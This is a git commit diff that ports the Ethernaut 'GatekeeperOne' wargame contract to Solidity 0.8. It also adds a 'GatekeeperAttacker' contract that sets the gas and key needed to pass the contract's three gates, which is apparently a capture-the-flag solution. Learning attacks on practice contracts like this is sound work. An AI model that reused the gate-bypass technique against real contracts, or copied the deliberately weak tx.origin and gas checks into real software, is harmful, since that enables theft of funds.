a1f8f323d13016c415a03c8da3d068912db5471b
Ammon Werner <ammon@altafin.co>
2022-05-25 15:13:50 -0600

    Update Gatekeep One.sol

--- contracts/Gatekeep One.sol
+++ contracts/Gatekeep One.sol
@@ -1,32 +1,56 @@
-// // SPDX-License-Identifier: MIT
-// pragma solidity ^0.6.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-// import '@openzeppelin/contracts/math/SafeMath.sol';
+import '@openzeppelin/contracts/utils/math/SafeMath.sol';
 
-// contract GatekeeperOne {
+contract GatekeeperOne {
 
-//   using SafeMath for uint256;
-//   address public entrant;
+  using SafeMath for uint256;
+  address public entrant;
 
-//   modifier gateOne() {
-//     require(msg.sender != tx.origin);
-//     _;
-//   }
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
 
-//   modifier gateTwo() {
-//     require(gasleft().mod(8191) == 0);
-//     _;
-//   }
+  modifier gateTwo() {
+    require(gasleft().mod(8191) == 0);
+    _;
+  }
 
-//   modifier gateThree(bytes8 _gateKey) {
-//       require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
-//       require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
-//       require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
-//     _;
-//   }
+  modifier gateThree(bytes8 _gateKey) {
+      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+    _;
+  }
 
-//   function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
-//     entrant = tx.origin;
-//     return true;
-//   }
-// }
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+
+contract GatekeeperAttacker {
+    function enter(
+        address gate,
+        bytes8 key,
+        uint256 gasToUse
+    ) external {
+        GatekeeperOne(gate).enter{gas: gasToUse}(key); 
+    }
+    function checkGate3(bytes8 key) external view {
+        require(
+            uint32(uint64(key)) == uint16(uint64(key)),
+            "GatekeeperOne: invalid gateThree part one"
+        );
+        require(
+            uint32(uint64(key)) != uint64(key),
+            "GatekeeperOne: invalid gateThree part two"
+        );
+        require(
+            uint32(uint64(key)) == uint16(uint160(tx.origin)),
+            "GatekeeperOne: invalid gateThree part three"
+        );
+    }
+}
